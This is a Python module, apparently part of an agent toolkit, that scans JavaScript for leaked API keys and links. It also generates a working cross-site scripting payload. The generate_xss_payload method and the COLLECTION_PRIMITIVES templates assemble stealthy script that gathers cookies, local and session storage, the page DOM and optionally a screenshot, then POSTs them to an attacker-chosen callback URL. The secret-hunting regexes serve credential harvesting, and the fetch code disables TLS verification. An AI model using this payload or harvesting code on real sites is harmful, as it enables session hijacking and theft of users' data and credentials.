#!/usr/bin/env python3


# Copyright 2026 PyAgent Authors
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import re
import aiohttp
from typing import List, Dict, Set, Optional
from urllib.parse import urljoin


class JSIntelligence:
    """
    Intelligence module for JavaScript analysis, secret discovery, and link extraction.
    Ported from jsleak, LinkFinder, and jsluce.
    """

    # Secret Discovery Regexes (Ported from 0xSojalSec-jsleak)
    SECRET_PATTERNS = {
        "Email": r"([a-zA-Z0-9][_\.\w]*)+@([a-zA-Z0-9][\w\-]*\.[a-zA-Z]{2,})\b",
        "AWS Access Key": r"(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}",
        "AWS MWS Key": r"amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
        "Authorization Header": r"(?i)basic [a-z0-9=:_\+\/-]{5,100}",
        "Bearer Token": r"(?i)bearer [a-z0-9=:_\+\/.-]{5,1000}",
        "Firebase URL": r"https://[a-z0-9.-]+\.firebaseio\.com",
        "Google API Key": r"(?i)\b(AIza[0-9A-Za-z\\-_]{35})\b",
        "Slack Token": r"xox[baprs]-([0-9a-zA-Z]{10,48})",
        "Slack Webhook": r"https:\/\/hooks.slack.com\/(services|workflows)\/[A-Za-z0-9+\/]{44,46}",
        "Generic Secret": r"(?i)(api_key|apikey|secret|password|passwd|auth)(.{0,20})?['|\"][0-9a-zA-Z]{16,45}['|\"]",
        "JSON Web Token": r"\bey[0-9a-z]{30,34}\.ey[0-9a-z-\/_]{30,500}\.[0-9a-zA-Z-\/_]{10,200}=",
        "Heroku API Key": r"(?i)heroku.*[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
        "Mailgun API Key": r"(?i)key-[a-f0-9]{32}",
        "Stripe API Key": r"(?i)(sk|pk)_(test|live)_[0-9a-z]{10,32}",
        "Twilio Account SID": r"AC[0-9a-f]{32}",
        "GitHub PAT": r"ghp_[0-9a-zA-Z]{36}",
        "GitHub OAuth": r"gho_[0-9a-zA-Z]{36}",
    }

    # Sink Hooks (Ported from 0xSojalSec-eval_villain)
    SINK_HOOKS = {
        "execution": ["eval", "Function", "setTimeout", "setInterval"],
        "dom_injection": ["set(Element.innerHTML)", "set(Element.outerHTML)", "document.write", "document.writeln"],
        "data_storage": ["localStorage.setItem", "sessionStorage.setItem"],
        "navigation": ["window.location", "window.open"],
    }

    # Sources of Interest
    INPUT_SOURCES = ["location.hash", "window.name", "document.cookie", "document.referrer"]

    # Collection Primitives (Ported from 0xSojalSec-ezXSS)
    COLLECTION_PRIMITIVES = {
        "basic_info": """
            var data = {
                uri: location.toString(),
                cookies: document.cookie,
                referrer: document.referrer,
                ua: navigator.userAgent,
                origin: location.origin,
                localStorage: JSON.stringify(window.localStorage),
                sessionStorage: JSON.stringify(window.sessionStorage),
                dom: document.documentElement.outerHTML
            };
        """,
        "page_extraction": """
            function extractPath(path) {
                var xhr = new XMLHttpRequest();
                xhr.open("GET", path, true);
                xhr.onreadystatechange = function() {
                    if (xhr.readyState == 4) {
                        sendCallback({path: path, content: xhr.responseText});
                    }
                };
                xhr.send();
            }
        """,
        "callback_template": """
            function sendCallback(data) {
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "{callback_url}", true);
                xhr.setRequestHeader("Content-type", "application/json");
                xhr.send(JSON.stringify(data));
            }
        """,
    }

    # Link Extraction Regex (Ported from LinkFinder)
    LINK_REGEX = (
        r"(?i)(?:\"|')((?:[a-z]{1,10}://|//)[^\"'/]{1,}\.[a-z]{2,}[^\"']{0,}|(?:/|\.\./|\./)"
        r"[^\"'><,;| *()(%%$^/\\\[\]][^\"'><,;|()]{1,}|[a-z0-9_\-/]{1,}/[a-z0-9_\-/]{1,}\."
        r"(?:[a-z]{1,4}|action)(?:[\?|#][^\"|']{0,}|)|[a-z0-9_\-/]{1,}/[a-z0-9_\-/]{3,}"
        r"(?:[\?|#][^\"|']{0,}|)|[a-z0-9_\-]{1,}\.(?:php|asp|aspx|jsp|json|action|html|js|txt|xml)"
        r"(?:[\?|#][^\"|']{0,}|))(?:\"|')"
    )

    def __init__(self, session: Optional[aiohttp.ClientSession] = None):
        self.session = session
        self._own_session = False

    async def get_session(self) -> aiohttp.ClientSession:
        if not self.session:
            self.session = aiohttp.ClientSession()
            self._own_session = True
        return self.session

    async def extract_secrets(self, content: str) -> Dict[str, List[str]]:
        """Extracts secrets and sensitive patterns from JS content."""
        results = {}
        for name, pattern in self.SECRET_PATTERNS.items():
            matches = re.findall(pattern, content)
            if matches:
                results[name] = list(set(matches))
        return results

    def extract_links(self, content: str, base_url: str) -> Set[str]:
        """Extracts and resolves links from JS content."""
        links = set()
        matches = re.finditer(self.LINK_REGEX, content)
        for match in matches:
            link = match.group(1).strip()
            if not link:
                continue

            # Resolve relative links
            try:
                full_url = urljoin(base_url, link)
                links.add(full_url)
            except Exception:
                pass
        return links

    def generate_xss_payload(self, callback_url: str, include_screenshot: bool = False) -> str:
        """
        Generates a stealthy data collection payload for XSS testing.
        Based on ezXSS implementation.
        """
        callback = self.COLLECTION_PRIMITIVES["callback_template"].replace("{callback_url}", callback_url)
        payload = f"(function(){{ {callback} "
        payload += "var d={}; try{d.uri=location.toString()}catch(e){}"
        payload += "try{d.cookies=document.cookie}catch(e){}"
        payload += "try{d.ref=document.referrer}catch(e){}"
        payload += "try{d.ua=navigator.userAgent}catch(e){}"
        payload += "try{d.origin=location.origin}catch(e){}"
        payload += "try{d.ls=JSON.stringify(window.localStorage)}catch(e){}"
        payload += "try{d.ss=JSON.stringify(window.sessionStorage)}catch(e){}"
        payload += "try{d.dom=document.documentElement.outerHTML}catch(e){}"

        if include_screenshot:
            # Note: Requires html2canvas to be present or loaded
            payload += (
                "try{html2canvas(document.body).then(function(c){d.scr=c.toDataURL();"
                "sendCallback(d);})}catch(e){sendCallback(d);}"
            )
        else:
            payload += "sendCallback(d);"

        payload += "})();"
        return payload

    async def analyze_url(self, url: str) -> Dict:
        """Downloads and analyzes a JS file from a URL."""
        try:
            session = await self.get_session()
            async with session.get(url, timeout=15, ssl=False) as response:
                if response.status == 200:
                    content = await response.text()
                    secrets = await self.extract_secrets(content)
                    links = self.extract_links(content, url)
                    return {
                        "url": url,
                        "status": "success",
                        "secrets_found": len(secrets),
                        "links_found": len(links),
                        "details": {"secrets": secrets, "links": list(links)},
                    }
        except Exception as e:
            return {"url": url, "status": "error", "message": str(e)}
        return {"url": url, "status": "error", "message": "Failed to fetch"}
